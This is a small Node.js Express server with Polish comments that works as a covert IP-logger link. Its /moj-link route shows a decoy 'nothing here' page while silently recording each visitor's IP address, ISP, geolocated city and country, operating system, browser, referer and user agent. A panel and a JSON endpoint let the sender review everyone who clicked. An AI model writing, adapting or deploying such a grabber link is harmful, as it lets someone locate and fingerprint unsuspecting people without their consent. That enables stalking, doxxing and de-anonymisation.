const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

const zapiszDane = (dane) => {
    let historia = [];
    if (fs.existsSync('baza.json')) {
        historia = JSON.parse(fs.readFileSync('baza.json', 'utf8'));
    }
    historia.push(dane);
    fs.writeFileSync('baza.json', JSON.stringify(historia, null, 2));
};

// TWÓJ LINK - teraz pokazuje napis "tu nic nie ma"
app.get('/moj-link', async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
    if (ip === '::1') ip = '127.0.0.1';

    const userAgentStr = req.headers['user-agent'];
    const parser = new UAParser(userAgentStr);
    const device = parser.getResult();
    const referer = req.headers.referer || 'HTTP-Referer is empty';

    let geoData = { country: 'Nieznany', city: 'Nieznane', isp: 'Nieznany' };
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if (response.data.status === 'success') {
            geoData = response.data;
        }
    } catch (error) {
        console.log('Błąd geolokalizacji:', error.message);
    }

    const noweKlikniecie = {
        data: new Date().toLocaleString('pl-PL'),
        ip: ip,
        isp: geoData.isp,
        kraj: geoData.country,
        miasto: geoData.city,
        system: `${device.os.name || 'Inne'} ${device.os.version || ''}`,
        przegladarka: `${device.browser.name || 'Inne'} ${device.browser.major || ''}`,
        referer: referer,
        userAgent: userAgentStr
    };

    zapiszDane(noweKlikniecie);

    // ZMIANA: Zamiast przekierowania, wyświetlamy napis
    res.send('<h1 style="text-align:center; margin-top: 20vh; font-family: Arial;">tu nic nie ma</h1>');
});

// PANEL - działa bez zmian
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

app.get('/api/dane', (req, res) => {
    if (fs.existsSync('baza.json')) {
        const dane = JSON.parse(fs.readFileSync('baza.json', 'utf8'));
        res.json(dane.reverse());
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`Serwer działa!`);
    console.log(`Twój link do wysyłania: http://localhost:${PORT}/moj-link`);
    console.log(`Twój panel: http://localhost:${PORT}/panel`);
});